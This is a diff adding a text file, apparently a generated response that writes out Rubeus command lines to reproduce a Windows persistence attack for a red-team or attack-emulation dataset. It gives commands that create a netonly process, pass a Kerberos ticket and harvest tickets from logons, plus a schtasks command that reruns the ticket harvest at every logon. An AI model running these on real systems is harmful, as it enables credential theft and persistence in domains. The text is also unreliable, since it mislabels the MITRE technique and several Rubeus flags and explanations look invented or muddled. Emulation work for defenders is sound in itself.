@@ -1,0 +1,21 @@
+Based on the provided documentation and attack description, I will generate realistic command lines using only the tool Rubeus to reproduce the attack behavior.
+
+The objective is to establish persistence by creating a scheduled task. The attack corresponds to MITRE technique T1543 (CREATE OR MODIFY SYSTEM PROCESS) under tactic TA0003 (PERSISTENCE).
+
+Here are the generated command lines:
+
+Command: `rubeus createnetonly /targetuser:<scheduled_task_user> /show`
+This command creates a new hidden process with SECURITY_LOGON_TYPE of 9 (NewCredentials), equivalent to runas /netonly, allowing us to apply specific Kerberos tickets. The `/show` option reveals the process ID and LUID.
+
+Command: `rubeus ptt /luid:<LUID> /targetuser:<scheduled_task_user>`
+This command applies a Kerberos ticket with the specified LUID to the target user, simulating elevation and preventing TGT erasure for the current logon session.
+
+Command: `rubeus harvest /targetuser:<scheduled_task_user> /interval:10`
+This command monitors logon events and dumps new tickets, allowing us to automatically renew TGTs. The `/interval` parameter specifies the interval between ticket renewals.
+
+To create a scheduled task:
+
+Command: `schtasks /create /tn "<scheduled_task_name>" /tr "rubeus harvest /targetuser:<scheduled_task_user> /interval:10" /sc ONLOGON`
+This command creates a new scheduled task with the specified name, triggering the Rubeus harvest command upon logon.
+
+Note that I've used placeholders for the `<scheduled_task_user>` and `<scheduled_task_name>` variables, as these values are not explicitly specified in the attack description.
